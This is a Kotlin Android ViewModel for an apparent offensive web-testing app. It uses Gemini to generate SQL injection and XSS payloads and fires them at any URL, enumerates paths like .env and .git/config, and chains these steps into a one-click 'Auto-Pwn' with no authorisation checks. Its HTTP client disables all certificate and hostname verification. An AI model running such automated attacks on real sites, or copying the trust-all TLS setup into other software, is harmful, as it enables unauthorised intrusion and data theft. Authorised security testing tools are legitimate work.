package com.example.rabit.ui.websniper

import android.app.Application
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.rabit.data.gemini.GeminiRepositoryImpl
import com.example.rabit.domain.model.gemini.GeminiRequest
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.security.SecureRandom
import java.security.cert.X509Certificate
import java.util.concurrent.TimeUnit
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager

data class FuzzResult(val payload: String, val responseCode: Int, val reflectionFound: Boolean, val dbErrorFound: Boolean)
data class DirScanResult(val path: String, val statusCode: Int)

enum class AutoPwnState {
    IDLE,
    RECONNAISSANCE,
    WEAPONIZATION,
    REPORTING,
    COMPLETE,
    ERROR
}

class WebSniperViewModel(application: Application) : AndroidViewModel(application) {

    private val geminiRepo = GeminiRepositoryImpl()

    // Fuzzer State
    private val _fuzzerLogs = MutableStateFlow<List<String>>(emptyList())
    val fuzzerLogs = _fuzzerLogs.asStateFlow()
    private val _fuzzerResults = MutableStateFlow<List<FuzzResult>>(emptyList())
    val fuzzerResults = _fuzzerResults.asStateFlow()
    private val _isFuzzing = MutableStateFlow(false)
    val isFuzzing = _isFuzzing.asStateFlow()

    // Dir Scanner State
    private val _dirResults = MutableStateFlow<List<DirScanResult>>(emptyList())
    val dirResults = _dirResults.asStateFlow()
    private val _isScanningDirs = MutableStateFlow(false)
    val isScanningDirs = _isScanningDirs.asStateFlow()
    private val _dirProgress = MutableStateFlow(0f)
    val dirProgress = _dirProgress.asStateFlow()

    // Repeater State
    private val _repeaterResponse = MutableStateFlow("")
    val repeaterResponse = _repeaterResponse.asStateFlow()
    private val _repeaterHeaders = MutableStateFlow("")
    val repeaterHeaders = _repeaterHeaders.asStateFlow()
    private val _isRepeating = MutableStateFlow(false)
    val isRepeating = _isRepeating.asStateFlow()

    // 1-Click Auto-Pwn State
    private val _autoPwnState = MutableStateFlow(AutoPwnState.IDLE)
    val autoPwnState = _autoPwnState.asStateFlow()
    private val _autoPwnLogs = MutableStateFlow<List<String>>(emptyList())
    val autoPwnLogs = _autoPwnLogs.asStateFlow()
    private val _autoPwnReport = MutableStateFlow<String?>(null)
    val autoPwnReport = _autoPwnReport.asStateFlow()

    private var currentFuzzJob: Job? = null
    private var currentDirJob: Job? = null
    private var currentAutoPwnJob: Job? = null

    // Unsafe OkHttpClient for Pentesting (Ignores SSL & Redirects)
    private val client: OkHttpClient by lazy {
        val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
            override fun checkClientTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
            override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
            override fun getAcceptedIssuers() = arrayOf<X509Certificate>()
        })
        val sslContext = SSLContext.getInstance("SSL")
        sslContext.init(null, trustAllCerts, SecureRandom())
        
        OkHttpClient.Builder()
            .sslSocketFactory(sslContext.socketFactory, trustAllCerts[0] as X509TrustManager)
            .hostnameVerifier { _, _ -> true }
            .followRedirects(false)
            .followSslRedirects(false)
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(10, TimeUnit.SECONDS)
            .build()
    }

    // --- AI-POWERED FUZZER ---
    fun startFuzzing(targetUrl: String, apiKey: String) {
        if (isFuzzing.value) return
        _isFuzzing.value = true
        _fuzzerLogs.value = listOf("[+] Initializing Neural Fuzzer against: $targetUrl")
        _fuzzerResults.value = emptyList()

        currentFuzzJob = viewModelScope.launch(Dispatchers.IO) {
            try {
                if (apiKey.isBlank()) {
                    logFuzzer("[-] Error: Gemini API Key missing.")
                    return@launch
                }
                
                logFuzzer("[~] Contacting Gemini for Contextual Payloads...")
                val req = GeminiRequest(
                    prompt = "Generate 10 highly advanced, context-aware SQLi and XSS payloads specifically tailored for an application hosted at $targetUrl. Format the output purely as a list of strings separated by newlines, with NO markdown formatting, NO numbering, and NO extra text.",
                    systemPrompt = "You are a professional DAST scanner payload generator. Output exactly 10 raw malicious string payloads separated by newlines.",
                    temperature = 0.8f
                )
                val response = geminiRepo.sendPrompt(req, apiKey)
                
                if (response.error != null) {
                    logFuzzer("[-] AI Payload Generation Failed: ${response.error.message}")
                    return@launch
                }

                val payloads = response.text.split("\n").filter { it.isNotBlank() }
                logFuzzer("[+] Generated ${payloads.size} dynamic payloads.")

                for (payload in payloads) {
                    if (!isActive) break
                    logFuzzer("[~] Injecting: $payload")
                    
                    // Basic GET injection (can be expanded to POST)
                    val injectionUrl = if (targetUrl.contains("?")) "$targetUrl$payload" else "$targetUrl?$payload"
                    
                    val request = Request.Builder().url(injectionUrl).build()
                    try {
                        client.newCall(request).execute().use { res ->
                            val bodyStr = res.body?.string() ?: ""
                            val reflection = bodyStr.contains(payload)
                            val dbError = bodyStr.contains("SQL syntax") || bodyStr.contains("mysql_fetch")
                            
                            val result = FuzzResult(payload, res.code, reflection, dbError)
                            _fuzzerResults.value = _fuzzerResults.value + result
                            
                            if (reflection) logFuzzer("[!] XSS Reflection Detected!")
                            if (dbError) logFuzzer("[!] SQL Error Discovered!")
                        }
                    } catch (e: Exception) {
                        logFuzzer("[-] Connection failed for payload.")
                    }
                    delay(500) // Rate limit
                }
                logFuzzer("[+] Neural Fuzzing Complete.")
            } catch (e: Exception) {
                logFuzzer("[-] Error: ${e.localizedMessage}")
            } finally {
                _isFuzzing.value = false
            }
        }
    }

    fun stopFuzzing() {
        currentFuzzJob?.cancel()
        _isFuzzing.value = false
        logFuzzer("[-] Fuzzing aborted by user.")
    }

    private fun logFuzzer(msg: String) {
        _fuzzerLogs.value = _fuzzerLogs.value + msg
    }

    // --- NEURAL SQL INJECTION (DATABASE DUMPPER) ---
    fun startSqlInjection(targetUrl: String, apiKey: String) {
        if (isFuzzing.value) return
        _isFuzzing.value = true
        _fuzzerLogs.value = listOf("[+] Initializing Neural SQLi Engine against: $targetUrl", "[*] Strategy: Information Extraction (Data Dumping)")
        _fuzzerResults.value = emptyList()

        currentFuzzJob = viewModelScope.launch(Dispatchers.IO) {
            try {
                if (apiKey.isBlank()) {
                    logFuzzer("[-] Error: Gemini API Key missing.")
                    return@launch
                }
                
                logFuzzer("[~] Gemini: Generating Data Extraction Payloads (Union/Blind)...")
                val req = GeminiRequest(
                    prompt = "Generate 8 advanced SQL injection payloads for data extraction (Union-based, Error-based, or Blind) for target: $targetUrl. Focus on extracting table names, database versions, or user data. Output raw strings only, one per line.",
                    systemPrompt = "You are an automated SQLi extraction tool. Generate payloads that will cause the server to leak database information in the response.",
                    temperature = 0.5f
                )
                val response = geminiRepo.sendPrompt(req, apiKey)
                
                if (response.error != null) {
                    logFuzzer("[-] AI Generation Failed: ${response.error.message}")
                    return@launch
                }

                val payloads = response.text.split("\n").filter { it.isNotBlank() }
                logFuzzer("[+] Armed with ${payloads.size} extraction vectors.")

                for (payload in payloads) {
                    if (!isActive) break
                    logFuzzer("[~] Extracting: $payload")
                    
                    val injectionUrl = if (targetUrl.contains("?")) "$targetUrl$payload" else "$targetUrl?$payload"
                    
                    val request = Request.Builder().url(injectionUrl).build()
                    try {
                        client.newCall(request).execute().use { res ->
                            val bodyStr = res.body?.string() ?: ""
                            
                            // Advanced detection: look for signs of data leakage
                            val leakedData = bodyStr.contains("root:") || bodyStr.contains("admin:") || bodyStr.contains("password") || bodyStr.contains("version()")
                            val dbError = bodyStr.contains("SQL syntax") || bodyStr.contains("mysql_fetch") || bodyStr.contains("PostgreSQL")
                            
                            val result = FuzzResult(payload, res.code, leakedData, dbError)
                            _fuzzerResults.value = _fuzzerResults.value + result
                            
                            if (leakedData) logFuzzer("[!!!] DATABASE LEAK DETECTED!")
                            if (dbError) logFuzzer("[!] Schema Leak via Error Message.")
                        }
                    } catch (e: Exception) {
                        logFuzzer("[-] Connection timed out.")
                    }
                    delay(800)
                }
                logFuzzer("[+] SQLi Operation Complete.")
            } catch (e: Exception) {
                logFuzzer("[-] Error: ${e.localizedMessage}")
            } finally {
                _isFuzzing.value = false
            }
        }
    }

    // --- DIRECTORY ENUMERATOR ---
    fun startDirScanner(targetDomain: String, threads: Int) {
        if (isScanningDirs.value) return
        _isScanningDirs.value = true
        _dirResults.value = emptyList()
        _dirProgress.value = 0f

        currentDirJob = viewModelScope.launch(Dispatchers.IO) {
            val wordlist = listOf(
                "admin", "login", "dashboard", ".git/config", ".env", "api", "api/v1", 
                "backup.zip", "test", "staging", "server-status", "robots.txt", "wp-admin"
            )
            
            val baseUrl = if (targetDomain.startsWith("http")) targetDomain else "http://$targetDomain"
            val sanitizedBase = if (baseUrl.endsWith("/")) baseUrl else "$baseUrl/"

            var completed = 0

            // Custom Thread Pool utilizing Coroutines
            val jobs = wordlist.map { path ->
                async(Dispatchers.IO) {
                    try {
                        val request = Request.Builder().url("$sanitizedBase$path").head().build()
                        client.newCall(request).execute().use { res ->
                            if (res.code != 404) {
                                val result = DirScanResult(path, res.code)
                                _dirResults.value = (_dirResults.value + result).sortedBy { it.statusCode }
                            }
                        }
                    } catch (e: Exception) {
                        // Ignore connection drops
                    } finally {
                        completed++
                        _dirProgress.value = completed.toFloat() / wordlist.size
                    }
                }
            }
            jobs.awaitAll()
            _isScanningDirs.value = false
        }
    }

    fun stopDirScanner() {
        currentDirJob?.cancel()
        _isScanningDirs.value = false
    }

    // --- REQUEST REPEATER ---
    fun sendRepeaterRequest(method: String, url: String, headersText: String, bodyText: String) {
        if (isRepeating.value) return
        _isRepeating.value = true
        _repeaterResponse.value = "Sending..."
        _repeaterHeaders.value = ""

        viewModelScope.launch(Dispatchers.IO) {
            try {
                val target = if (url.startsWith("http")) url else "http://$url"
                val reqBuilder = Request.Builder().url(target)
                
                headersText.split("\n").forEach { line ->
                    if (line.contains(":")) {
                        val parts = line.split(":", limit = 2)
                        reqBuilder.addHeader(parts[0].trim(), parts[1].trim())
                    }
                }

                val reqBody = if (bodyText.isNotBlank()) bodyText.toRequestBody("text/plain".toMediaTypeOrNull()) else null
                
                when (method.uppercase()) {
                    "GET" -> reqBuilder.get()
                    "POST" -> reqBuilder.post(reqBody ?: "".toRequestBody(null))
                    "PUT" -> reqBuilder.put(reqBody ?: "".toRequestBody(null))
                    "DELETE" -> reqBuilder.delete(reqBody)
                    "OPTIONS" -> reqBuilder.method("OPTIONS", null)
                }

                client.newCall(reqBuilder.build()).execute().use { res ->
                    _repeaterHeaders.value = "HTTP/1.1 ${res.code} ${res.message}\n" + res.headers.toString()
                    _repeaterResponse.value = res.body?.string() ?: "No body."
                }
            } catch (e: Exception) {
                _repeaterResponse.value = "Error: ${e.localizedMessage}"
            } finally {
                _isRepeating.value = false
            }
        }
    }

    // --- 1-CLICK AUTO-PWN ORCHESTRATOR ---
    private fun logAutoPwn(msg: String) {
        _autoPwnLogs.value = _autoPwnLogs.value + msg
    }

    fun startAutoPwn(targetDomain: String, apiKey: String) {
        if (_autoPwnState.value != AutoPwnState.IDLE && _autoPwnState.value != AutoPwnState.COMPLETE && _autoPwnState.value != AutoPwnState.ERROR) return
        
        _autoPwnState.value = AutoPwnState.RECONNAISSANCE
        _autoPwnLogs.value = emptyList()
        _autoPwnReport.value = null
        
        currentAutoPwnJob = viewModelScope.launch(Dispatchers.IO) {
            try {
                if (apiKey.isBlank()) {
                    logAutoPwn("[-] Error: Gemini API Key missing.")
                    _autoPwnState.value = AutoPwnState.ERROR
                    return@launch
                }

                val baseUrl = if (targetDomain.startsWith("http")) targetDomain else "http://$targetDomain"
                
                // PHASE 1: RECONNAISSANCE
                logAutoPwn("[*] Initiating Phase 1: Reconnaissance (Directory Bruteforce)")
                startDirScanner(targetDomain, 15) // Start dir scanner
                
                // Wait for Dir Scanner to complete
                while (isScanningDirs.value) {
                    delay(500)
                }
                
                val discoveredEndpoints = _dirResults.value.filter { it.statusCode == 200 || it.statusCode == 403 || it.statusCode == 301 || it.statusCode == 302 }
                logAutoPwn("[+] Recon Complete. Found ${discoveredEndpoints.size} active endpoints.")
                
                // PHASE 2: WEAPONIZATION
                _autoPwnState.value = AutoPwnState.WEAPONIZATION
                logAutoPwn("[*] Initiating Phase 2: AI Weaponization & Injection")
                
                val targetsToFuzz = if (discoveredEndpoints.isNotEmpty()) {
                    discoveredEndpoints.map { if (baseUrl.endsWith("/")) "$baseUrl${it.path}" else "$baseUrl/${it.path}" }
                } else {
                    listOf(baseUrl) // Fuzz the root if nothing found
                }

                // Fuzz the first 3 interesting endpoints to save time/tokens during a live hackathon demo
                val topTargets = targetsToFuzz.take(3)
                for (target in topTargets) {
                    logAutoPwn("[~] Instructing Neural Fuzzer to attack: $target")
                    startFuzzing(target, apiKey)
                    
                    while (isFuzzing.value) {
                        delay(500)
                    }
                }
                
                logAutoPwn("[+] Weaponization Complete. Captured ${fuzzerResults.value.size} exploit attempts.")

                // PHASE 3: REPORTING
                _autoPwnState.value = AutoPwnState.REPORTING
                logAutoPwn("[*] Initiating Phase 3: AI Triage & Reporting")
                
                val reportPrompt = buildString {
                    appendLine("You are an elite autonomous AI penetration tester writing an executive summary based on raw DAST scan data. Produce a highly professional, formatting-rich markdown report (using bolding, lists, and headers) detailing the vulnerabilities discovered.")
                    appendLine("Target: $targetDomain")
                    appendLine("--- RECONNAISSANCE DATA ---")
                    if (discoveredEndpoints.isEmpty()) appendLine("No hidden directories found.")
                    discoveredEndpoints.forEach { appendLine("/${it.path} -> HTTP ${it.statusCode}") }
                    appendLine("--- WEAPONIZATION DATA ---")
                    val successfulExploits = fuzzerResults.value.filter { it.reflectionFound || it.dbErrorFound }
                    if (successfulExploits.isEmpty()) appendLine("No critical injections were successful.")
                    successfulExploits.forEach { 
                        val type = if (it.dbErrorFound) "SQLi" else "XSS"
                        appendLine("VULN: $type | Payload: ${it.payload} | HTTP ${it.responseCode}") 
                    }
                }

                val req = GeminiRequest(
                    prompt = reportPrompt,
                    systemPrompt = "You are a cyber security expert. Output a crisp, tactical vulnerability assessment report in markdown.",
                    temperature = 0.4f
                )
                
                logAutoPwn("[~] Compiling telemetry and requesting Gemini analysis...")
                val response = geminiRepo.sendPrompt(req, apiKey)
                
                if (response.error != null) {
                    logAutoPwn("[-] Report Generation Failed: ${response.error.message}")
                    _autoPwnState.value = AutoPwnState.ERROR
                    return@launch
                }
                
                _autoPwnReport.value = response.text
                logAutoPwn("[+] Autonomous Penetration Test Complete.")
                _autoPwnState.value = AutoPwnState.COMPLETE

            } catch (e: CancellationException) {
                logAutoPwn("[-] Auto-Pwn aborted.")
                _autoPwnState.value = AutoPwnState.IDLE
            } catch (e: Exception) {
                logAutoPwn("[-] Critical Failure: ${e.localizedMessage}")
                _autoPwnState.value = AutoPwnState.ERROR
            }
        }
    }

    fun stopAutoPwn() {
        currentAutoPwnJob?.cancel()
        stopDirScanner()
        stopFuzzing()
        _autoPwnState.value = AutoPwnState.IDLE
    }
}
